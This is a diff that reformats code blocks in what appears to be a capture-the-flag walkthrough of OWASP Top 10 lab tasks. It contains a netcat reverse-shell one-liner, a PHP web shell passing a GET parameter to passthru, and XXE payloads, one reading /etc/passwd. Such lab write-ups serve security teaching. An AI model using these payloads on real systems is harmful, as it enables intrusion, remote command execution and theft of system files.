@@ -49,13 +49,13 @@ In the url `http://<ip>/evilshell.php`, use the below command to spawn a reverse
 {% capture code %}{% raw %}mkfifo /tmp/p ; nc <remote-ip> 4444 0</tmp/p | /bin/sh -i 2>&1 | tee /tmp/p{% endraw %}{% endcapture %} {% include code.html code=code %}
 
 The sample php shell code from `evilshell.php` is as below.
-{% capture code %}{% raw %}    <?php
-        if (isset($_GET["commandString"])) {
-            $command_string = $_GET["commandString"];
-            try { passthru($command_string); }
-            catch (Error $error) { echo "<p class=mt-3><b>$error</b></p>"; }
-        }
-    ?>{% endraw %}{% endcapture %} {% include code.html code=code %}
+{% capture code %}{% raw %}<?php
+  if (isset($_GET["commandString"])) {
+    $command_string = $_GET["commandString"];
+    try { passthru($command_string); }
+    catch (Error $error) { echo "<p class=mt-3><b>$error</b></p>"; }
+  }
+?>{% endraw %}{% endcapture %} {% include code.html code=code %}
 
 To read motd data in ubuntu, use the file `cat /etc/update-motd.d/00-header`.
 
@@ -104,7 +104,7 @@ Use `firefox` to navigate to url `http://<ip>/<directory>` and download the `dat
 
 Inspect the file and use `sqlite3` to view contents of the `database`.
 {% capture code %}{% raw %}root@<hostname>:~# file <database>
-    <database>: SQLite 3.x database, last written using SQLite version 3022000
+  <database>: SQLite 3.x database, last written using SQLite version 3022000
 
 root@<hostname>:~# sqlite3 <database>
 SQLite version 3.22.0 2018-01-22 18:45:57
@@ -168,14 +168,14 @@ The type of elements in `note.dtd` file is as below.
 - #PCDATA - Parseable Character DATA
 
 Example `note.xml` file referring to `note.dtd`.
-{% capture code %}{% raw %}   <?xml version="1.0" encoding="UTF-8"?>
-    <!DOCTYPE note SYSTEM "note.dtd">
-    <note>
-        <to>falcon</to>
-        <from>feast</from>
-        <heading>hacking</heading>
-        <body>XXE attack</body>
-    </note>{% endraw %}{% endcapture %} {% include code.html code=code %}
+{% capture code %}{% raw %}<?xml version="1.0" encoding="UTF-8"?>
+  <!DOCTYPE note SYSTEM "note.dtd">
+  <note>
+    <to>falcon</to>
+    <from>feast</from>
+    <heading>hacking</heading>
+    <body>XXE attack</body>
+  </note>{% endraw %}{% endcapture %} {% include code.html code=code %}
 
 
 ## Task 15 - [Severity 4] XML External Entity - XXE Payload
@@ -195,11 +195,11 @@ Nmap done: 1 IP address (1 host up) scanned in 1.90 seconds{% endraw %}{% endcap
 
 Use `firefox` to load url `http://<ip>` and try the below payloads.
 
-{% capture code %}    <!DOCTYPE replace [<!ENTITY name "feast"> ]>
-        <userInfo>
-            <firstName>falcon</firstName>
-            <lastName>&amp;name;</lastName>
-        </userInfo>{% endcapture %} {% include code.html code=code%}
+{% capture code %}<!DOCTYPE replace [<!ENTITY name "feast"> ]>
+  <userInfo>
+    <firstName>falcon</firstName>
+    <lastName>&amp;name;</lastName>
+  </userInfo>{% endcapture %} {% include code.html code=code%}
 
 {% capture code %}<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
 <root>&amp;read;</root>{% endcapture %} {% include code.html code=code%}
